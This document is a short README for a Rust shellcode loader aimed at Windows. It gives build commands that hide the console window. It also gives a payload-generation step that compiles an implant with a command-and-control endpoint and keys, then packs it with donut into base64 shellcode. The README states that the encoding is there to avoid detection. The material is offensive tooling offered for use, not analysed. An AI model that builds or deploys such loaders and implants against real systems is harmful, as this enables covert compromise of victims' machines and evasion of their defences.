# rust-loader
A simple windows binary loader, written in rust

The shellcode has to be put in the src/payload.b64 file.

shell is base64 encoded to prevent donut detection

## To build : 

Win x86
```shell
cargo build --target i686-pc-windows-gnu --release --features no_console
```
Win x64
```shell
cargo build --target x86_64-pc-windows-gnu --release --features no_console
```


## Generate payload : 
```shell
cross build --target x86_64-pc-windows-gnu --release --features no_console --config "env.ENDPOINT.value='https://192.168.48.128'" --config "env.C2_SERVER_KEY.value='MXlPZEVWWGVmN2xqbnpyUg=='" --config "env.LITCRYPT_ENCRYPT_KEY.value='thisisadeploymentkey'"
```
```shell
/opt/donut/donut -i /mnt/Share/Projects/Rust/Droid/target/x86_64-pc-windows-gnu/release/droid.exe -f 2 -a 2 -o /mnt/Share/Projects/Rust/rust-loader/src/payload.b64
```